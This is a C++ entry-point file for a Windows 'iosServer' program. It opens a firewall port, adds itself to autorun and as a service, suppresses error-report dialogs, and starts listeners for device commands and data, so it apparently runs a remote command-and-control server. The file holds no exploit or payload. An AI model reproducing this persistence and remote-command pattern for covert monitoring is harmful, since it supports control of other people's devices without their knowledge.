

//如果提示缺少vcruntime140.dll,将开发机C:\Program Files (x86)\Microsoft Visual Studio 14.0\VC\redist\x86\Microsoft.VC140.CRT
//目录下的几个文件复制到服务器主机C:\Windows\SysWOW64文件夹里即可
//注意因为本程序是32位所以需要到本机32位目录下复制，不要到64位目录复制msvrct.dll

#include <windows.h>
#include <winsock.h>
#include "iosServer.h"
#include "PublicFunction.h"
#include "DownloadApk.h"
#include "DataProcess.h"
#include "QRCode.h"
#include "CommandProcess.h"
#include "Shlwapi.h"
#include <Dbghelp.h>
#include "WatchDog.h"
#include "LoginWindow.h"
#include "DataListener.h"
#include "CommandListener.h"
#include "FileOperator.h"
#include "Initor.h"
#include <iostream>
#include "recommit.h"
#include "FileWriter.h"
#include "iosmysqlOper.h"
#include "DataKeeper.h"

#pragma comment(lib,"ws2_32.lib")
#pragma comment( lib, "Shlwapi.lib")
#pragma comment(lib,"dbghelp.lib")

using namespace std;


#define WINSOCK_VERSION		0x0202
//DWORD	SERVER_IP_ADDRESS = 0;



string getParentPath(char * szcurdir) {
	int cnt = 0;
	int i = lstrlenA(szcurdir);
	for (;i >= 0; i--)
	{
		if (szcurdir[i] == '\\')
		{
			cnt++;
			if (cnt >= 2)
			{
				string ret = string(szcurdir, 0, i+1);
				return ret;
			}
		}
	}

	return "";
}

//
//上传到 fir.im 或    pgyer.com；同时还可以自己利用七牛的对象储存自己配置下载
//satadriver007
//satadriver

DWORD __stdcall InitProgram() {
	char szShowInfo[1024];
	int iRet = Initor::CheckIfProgramExist();
	if (iRet)
	{
		WriteLogFile("one program instance is already running\r\n");
		return FALSE;
		ExitProcess(0);
	}

	WSADATA data = { 0 };
	int ret = WSAStartup(WINSOCK_VERSION, &data);
	if (ret)
	{
		WriteLogFile("WSAStartup error\r\n");
		return FALSE;
	}

	DWORD SERVER_IP_ADDRESS = FileOperator::GetIPFromConfigFile();
	if (SERVER_IP_ADDRESS == 0)
	{
		SERVER_IP_ADDRESS = INADDR_ANY;

		wsprintfA(szShowInfo, "not found ip config file:%s error\r\n", IP_CONFIG_FILE);
		WriteLogFile(szShowInfo);
	}

	char szcurdir[MAX_PATH] = { 0 };
	GetModuleFileNameA(0, szcurdir, MAX_PATH);
	char * lpchar =strrchr(szcurdir, '\\');
	if (lpchar)
	{
		*(lpchar+1) = 0;
		SetCurrentDirectoryA(szcurdir);
	}

	//GetCurrentDirectoryA(MAX_PATH, szcurdir);

	char tmppath[MAX_PATH];
	lstrcpyA(tmppath, szcurdir);
	lstrcatA(tmppath, "\\");
	lstrcatA(tmppath, COMMAND_DIR_NAME);
	lstrcatA(tmppath, "\\");
	iRet = MakeSureDirectoryPathExists(tmppath);

	lstrcpyA(tmppath, szcurdir);
	lstrcatA(tmppath, "\\");
	lstrcatA(tmppath, UPLOAD_FILE_DIR_NAME);
	lstrcatA(tmppath, "\\");
	iRet = MakeSureDirectoryPathExists(tmppath);

	lstrcpyA(tmppath, szcurdir);
	lstrcatA(tmppath, "\\");
	lstrcatA(tmppath, DOWNLOAD_FILE_DIR_NAME);
	lstrcatA(tmppath, "\\");
	iRet = MakeSureDirectoryPathExists(tmppath);

	iRet = Initor::OpenFireWallPort();
	if (iRet == FALSE)
	{
		return FALSE;
	}

#ifndef _DEBUG
	PublicFunction::autorun();

	string parentpath = getParentPath(szcurdir);
	ShellExecuteA(0, "open", "..\\listen_server.bat", 0, parentpath.c_str(), SW_SHOW);
	//WinExec("..\\listen_server.bat", SW_SHOW);

	char szexefp[MAX_PATH];
	GetModuleFileNameA(0, szexefp, MAX_PATH);
	PublicFunction::addService(szexefp, "");

	iRet = system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Windows Error Reporting\" /v \"DontShowUI\" /t REG_DWORD /d 1 /f");
#endif

	MySql::initLock();

	CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)DataKeeper::recommit, 0, 0, 0));

	return TRUE;
}




int __stdcall WinMain(__in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in LPSTR lpCmdLine, __in int nShowCmd) {

	int ret = InitProgram();
	if (ret == FALSE)
	{
		return FALSE;
	}

#ifdef NEED_LOGIN_WINDOW
	int iRet = GetSecondsFromStartDate();
	iRet = DialogBoxParamA(hInstance, (LPSTR)IDD_DIALOG1, 0, (DLGPROC)LoginWindow, 0);
	int error = GetLastError();
	if (iRet == FALSE && ERROR == FALSE)
	{
		ExitProcess(0);
	}

	CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)CheckProductValidation, 0, 0, 0));
#endif

	CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)CommandListener::Commandlistener, 0, 0, 0));

	//CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)QRCode::QRCodeListener, 0, 0, 0));

	CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)DataListener::DataProcessListener, 0, 0, 0));

	//CloseHandle(CreateThread(0,0,(LPTHREAD_START_ROUTINE)DownloadApk::DownloadApkListener,0,0,0));

	CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)WatchDog::RefreshOnlineInfo, 0, 0, 0));

	//CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Recommit::recommit, 0, 0, 0));

	WriteLogFile("program start ok\r\n");

	Sleep(-1);

	WSACleanup();
	return TRUE;
}